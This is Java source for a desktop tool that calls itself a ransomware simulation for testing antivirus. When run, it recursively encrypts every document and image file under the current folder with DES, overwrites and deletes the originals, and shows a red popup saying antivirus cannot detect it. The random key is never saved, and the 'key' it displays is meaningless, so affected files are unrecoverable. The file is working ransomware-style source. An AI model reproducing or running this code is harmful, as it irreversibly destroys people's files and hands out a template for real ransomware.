import java.util.Scanner;
import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

import java.io.*;
import java.nio.file.StandardCopyOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import javax.swing.*;
import java.awt.event.*;
import javax.swing.*;
import java.awt.*;

import java.net.URI;
import java.awt.Desktop;

public class EncryptDelTestv3 extends JPanel implements ActionListener {
    private static Cipher encrypt;
    private static JTextArea textarea = new JTextArea(40, 60);
    private static JButton button = new JButton("Continue");
    private static final byte[] initialization_vector = {99,11,88,00,55,66,33,22};
    private static SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
    private static Date today = new Date();
    public static int encryptedcount;
    
    public EncryptDelTestv3(){
        JFrame frame = new JFrame("EncryptDelTestv3");
        textarea.setFocusable(false);
        textarea.setWrapStyleWord(false);
        textarea.setLineWrap(false);
        Font font = new Font("Courier New", Font.BOLD, 12);
        textarea.setFont(font);
        JScrollPane scrollpane = new JScrollPane(textarea);
        scrollpane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);

        frame.setBounds(3, 3, 3, 3);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.getContentPane().setLayout(new BorderLayout(3, 3));
        frame.getContentPane().add(new JScrollPane(textarea), BorderLayout.CENTER);
        frame.getContentPane().add(button, BorderLayout.SOUTH);
        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
        button.addActionListener(this);
    } 
    
    public static void main(String[] args) throws IOException, ParseException {
        new EncryptDelTestv3();
        Date expirydate = sdf.parse("2021-1-18");
        System.out.println("");
        textarea.append("[Encrypt Delete Test v3 (Java)]\n");
        textarea.append("Simulate ransomware encryption operation\n");
        textarea.append("By Eddie Chu eddiechu.android@gmail.com\n");
        textarea.append("Please download the original and latest version from\n");
        textarea.append("github.com/eddiechu/Encrypt-Delete-Test\n");
        textarea.append("Version v3.0.4 (14/Aug/2021)\n");
        textarea.append("\n");
        textarea.append("This tool encrypt the file, with extension of *.doc,*.docx,*.xls,*.xlsx,*.txt,*.rtf,*.pdf,*.jpg,*.jpeg,*.gif,*.bmp,*.png, under current folder and it's subfolder(s)\n");
        textarea.append("\n");
        textarea.append("[Caution]\n");
        textarea.append("You use this tool completely at your own risk.\n");
        textarea.append("\n");
        textarea.append("Please click \"Continue\" to proceed\n");
        textarea.setCaretPosition(textarea.getDocument().getLength());
    }

    public static void goProcess() {
        textarea.append("\n");
        System.out.println("");
        File currentDir = new File("."); 
        displayDirectoryContents(currentDir);
        try {
           BufferedWriter out = new BufferedWriter(new FileWriter("popup.html"));
           out.write("<html>\n");
           out.write("<head>\n");
           out.write("<title>EncryptDelTestv3</title>\n");
           out.write("<body bgcolor=red>\n");
           out.write("<font size=+10 color=white><b>[EncryptDelTestv3 (Java)]</b></font><br><br><br><br>\n");
           out.write("<font size=+10 color=white>Thanks for your test!</font><br><br>\n");
           out.write("<font size=+10 color=white>Your anti-virus software <u>CANNOT</u> detect this test</font><br><br>\n");
           out.write("<br>\n");
           out.write("<br>\n");
           out.write("<br>Encryption Key: " + initialization_vector + "\n");
           out.write("<br>Encrypted File: " + encryptedcount + "\n");
           out.write("<br>" + sdf.format(today) + "\n");
           out.write("<br>\n");
           out.write("</body>\n");
           out.write("</html>\n");
           out.close();
        }
        catch (IOException e) {
        }        

        textarea.append("\n");
        System.out.println("");
        
        if (encryptedcount > 0){
          java.awt.Desktop desktop = java.awt.Desktop.getDesktop();
          if( desktop.isSupported( java.awt.Desktop.Action.BROWSE ) ) {
              try {
                java.net.URI uri = new java.net.URI("popup.html");
                desktop.browse( uri );
              }
              catch ( Exception e ) {
                System.err.println( e.getMessage() );
              }
          }
          textarea.append("Encryption Key: " + initialization_vector + "\n");
          System.out.println("Encryption Key: " + initialization_vector);
          textarea.append("Encrypted File: " + encryptedcount + "\n");
          System.out.println("Encrypted File: " + encryptedcount );
          textarea.setForeground(Color.RED);
          textarea.append("Your anti-virus software CANNOT detect this test\n");      
          System.out.println("Your anti-virus software CANNOT detect this test");
        } else {
          textarea.append("No file is found or encrypted\n");      
          System.out.println("No file is found or encrypted");
        }
        textarea.setCaretPosition(textarea.getDocument().getLength());
        JFrame f;  
        f=new JFrame();  
        if (encryptedcount > 0){
          JOptionPane.showMessageDialog(f,"Your anti-virus software CANNOT detect this test!","EncryptDelTestv3",JOptionPane.ERROR_MESSAGE);
        }
    }
    
    public static void displayDirectoryContents(File dir) {
      try {
              File[] files = dir.listFiles();
              for (File file: files) {
                  if (file.isDirectory()) {
                      displayDirectoryContents(file);
                  } else {
                      if (file.getCanonicalPath().toLowerCase().endsWith(".doc") || file.getCanonicalPath().toLowerCase().endsWith(".docx")  || file.getCanonicalPath().toLowerCase().endsWith(".xls") || file.getCanonicalPath().toLowerCase().endsWith(".xlsx") || file.getCanonicalPath().toLowerCase().endsWith(".txt") || file.getCanonicalPath().toLowerCase().endsWith(".rtf") || file.getCanonicalPath().toLowerCase().endsWith(".pdf") || file.getCanonicalPath().toLowerCase().endsWith(".jpg") || file.getCanonicalPath().toLowerCase().endsWith(".jpeg") || file.getCanonicalPath().toLowerCase().endsWith(".gif") || file.getCanonicalPath().toLowerCase().endsWith(".bmp") || file.getCanonicalPath().toLowerCase().endsWith(".png")){
                          System.out.println(file.getCanonicalPath());
                          textarea.append(file.getCanonicalPath()+"\n");
                          JavaDESEncryption(file.getCanonicalPath());
                      }
                  }
              }
          } catch (IOException e) {
              e.printStackTrace();
          }
    }

    public static void JavaDESEncryption(String filename) {

        String clearFile = filename;
        String encryptedFile = filename + ".encrypted";

        try {

            SecretKey secret_key = KeyGenerator.getInstance("DES").generateKey();
            AlgorithmParameterSpec alogrithm_specs = new IvParameterSpec(initialization_vector);

            encrypt = Cipher.getInstance("DES/CBC/PKCS5Padding");
            encrypt.init(Cipher.ENCRYPT_MODE, secret_key, alogrithm_specs);

            textarea.append("encrypt to " + clearFile + "\n");
            System.out.println("encrypt to " + clearFile);            
            encrypt(new FileInputStream(clearFile), new FileOutputStream(encryptedFile));
            encryptedcount = encryptedcount + 1;
            textarea.append("overwrite " + clearFile + "\n");
            System.out.println("overwrite " + clearFile);            
            File file = new File(clearFile);
            Path pathencryptedFile = Paths.get(encryptedFile);
            Path pathclearFile = Paths.get(clearFile);
            Files.copy(pathencryptedFile, pathclearFile, StandardCopyOption.REPLACE_EXISTING);
            file.delete();

            textarea.append("delete " + clearFile + "\n");
            System.out.println("delete " + clearFile);
            textarea.append("verify " + clearFile + " ... ");
            System.out.print("verify " + clearFile + " ... ");            
            File f = new File(clearFile);
            if (f.exists() && f.isFile()) {
                textarea.append("(exist)\n");
                System.out.println("(exist)");                
            } else {
                textarea.append("(not exist)\n");
                System.out.println("(not exist)");
            }
            textarea.append("\n");
            System.out.println("");
            
        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | InvalidAlgorithmParameterException | IOException e) {
            e.printStackTrace();
        }

    }

    private static void encrypt(InputStream input, OutputStream output)
    throws IOException {

        output = new CipherOutputStream(output, encrypt);
        writeBytes(input, output);
    }

    private static void writeBytes(InputStream input, OutputStream output)
    throws IOException {
        byte[] writeBuffer = new byte[512];
        int readBytes = 0;

        while ((readBytes = input.read(writeBuffer)) >= 0) {
            output.write(writeBuffer, 0, readBytes);
        }

        output.close();
        input.close();
    }

    @Override
    public void actionPerformed(ActionEvent e){
        button.setEnabled(false); 
        goProcess();
    }
    
}

